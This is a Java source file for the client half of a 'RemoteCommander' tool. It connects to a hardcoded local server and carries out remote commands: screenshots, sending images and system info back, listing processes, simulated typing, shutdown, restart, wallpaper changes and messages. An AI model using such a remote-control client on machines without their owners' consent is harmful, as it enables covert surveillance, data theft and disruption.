package com.github.connorf.RemoteCommander;

import static com.github.connorf.RemoteCommander.CommandConstants.*;

import java.awt.*;
import java.io.*;
import java.net.Socket;

/**
 * the program that runs on each clients machine. The com.github.connorf.RemoteCommander.Client class
 * connects to the com.github.connorf.RemoteCommander.Server and waits for instructions
 */
public class Client
{
    private static final int SERVER_PORT = 0xbeef;
    private static final String SERVER_IP_ADDRESS = "127.0.0.1";
    private Socket socket;
    private CommandSet commandSet;

    public Client() throws IOException, UnknownOperatingSystemException, AWTException
    {
        connectAndListen();
    }

    /**
     * gets the appropriate command set for the OS that the client is running
     * @param connection the socket that the client is using to connect to the server
     * @return the com.github.connorf.RemoteCommander.CommandSet that will work on the clients operating system
     * @throws UnknownOperatingSystemException if the operating system is unrecognised
     */
    private CommandSet setCommandSet(Socket connection) throws UnknownOperatingSystemException
    {
        String operatingSystem = System.getProperty("os.name");
        if(operatingSystem.equals(OS_LINUX))
            return new LinuxCommandSet(connection);
        if(operatingSystem.startsWith(OS_WINDOWS))
            return new WindowsCommandSet(connection);
        if(operatingSystem.startsWith(OS_MAC))
            return new MacCommandSet(connection);

        throw new UnknownOperatingSystemException("Client OS not Linux, Mac or Windows");
    }

    /**
     * connects to the server (if its online) and waits for commands
     * @throws IOException if something went wrong with the socket
     * @throws AWTException something went wrong in the processServerCommand() method
     * @throws UnknownOperatingSystemException if the client isn't running windows, linux or mac (although support for any os
     * can be added quite easily)
     */
    private void connectAndListen() throws IOException, AWTException, UnknownOperatingSystemException
    {
        socket = new Socket(SERVER_IP_ADDRESS, SERVER_PORT);
        commandSet = setCommandSet(socket);

        while(socket.isConnected())
        {
            String serverCommand = commandSet.getCommandFromServer();
            System.out.println("Command read from server: " + serverCommand);
            if(serverCommand.equals(CMD_TYPE) || serverCommand.equals(CMD_ROTATE)) // 1 arg commands
                processServerCommand(serverCommand, commandSet.getCommandFromServer());
            else if(serverCommand.equals(CMD_CHAOS) || serverCommand.equals(CMD_SOUND) || serverCommand.equals(CMD_WALLPAPER)) // 2 arg commands
                processServerCommand(serverCommand, commandSet.getCommandFromServer(), commandSet.getCommandFromServer());
            else if(serverCommand.equals(CMD_MSG)) // 4 arg commands
                processServerCommand(serverCommand, commandSet.getCommandFromServer(), commandSet.getCommandFromServer(), commandSet.getCommandFromServer());
            else
                processServerCommand(serverCommand);
        }
    }

    /**
     * calls the appropriate method on the com.github.connorf.RemoteCommander.CommandSet depending on what the server wants us to do to
     * the client
     * @param serverCommand the command from the server and optionally extra arguments (msg command for example provides a msg arg)
     */
    private void processServerCommand(String... serverCommand) throws IOException, AWTException
    {
        switch(serverCommand[0].toLowerCase())
        {
            case CMD_EJECT:
                commandSet.eject();
                return;
            case CMD_WALLPAPER:
                try
                {
                    int fileSize = Integer.valueOf(serverCommand[1]);
                    String fileType = serverCommand[2];
                    File image = commandSet.getFileFromServer(fileSize, "wal", fileType);
                    commandSet.setWallpaper(image);
                    image.deleteOnExit();
                }
                catch(Exception e)
                {
                    System.out.println("play sound excelption");
                    e.printStackTrace();
                }
                break;
            case CMD_SOUND: // special case: sound requires the sound file from the server so we must retrieve it
                try
                {
                    int fileSize = Integer.valueOf(serverCommand[1]);
                    String fileType = serverCommand[2];
                    if(fileType.equals(TYPE_WAV)) // java sound supports wav files
                        new Thread(new MakeSound(commandSet.getFileFromServer(fileSize, "sou", ".wav"))).start();
                }
                catch(Exception e)
                {
                    System.out.println("play sound excelption");
                    e.printStackTrace();
                }
                return;
            case CMD_SCREENSHOT:
                commandSet.takeScreenshot();
                return;
            case CMD_MSG:
                commandSet.showMessage(serverCommand[1], serverCommand[2], serverCommand[3]);
                return;
            case CMD_SHUTDOWN:
                commandSet.shutdown();
                return;
            case CMD_RESTART:
                commandSet.restart();
                return;
            case CMD_CHAOS:
                commandSet.chaos(Long.valueOf(serverCommand[1]), Long.valueOf(serverCommand[2]));
                break;
            case CMD_TYPE:
                commandSet.type(serverCommand[1]);
                break;
            case CMD_RETRIEVE:
                commandSet.sendAllImages();
                break;
            case CMD_SYSINFO:
                String sysinfo = commandSet.getSysInfo();
                commandSet.sendStringToServer(sysinfo);
                break;
            case CMD_ROTATE:
                if(serverCommand[1].equals(DIR_NORMAL) || serverCommand[1].equals(DIR_INVERTED) || serverCommand[1].equals(DIR_LEFT) || serverCommand[1].equals(DIR_RIGHT))
                    commandSet.rotate(serverCommand[1]);
                break;
            case CMD_MINIMISE:
                commandSet.minimise();
                break;
            case CMD_LIST_PROCESSES:
                String procs = commandSet.getRunningProcesses();
                commandSet.sendStringToServer(procs);
                break;
            default:
                System.out.println("Reached default in processServerCommand break. With serverCommands: ");
                for(String s : serverCommand)
                    System.out.println(s);
        }
    }
}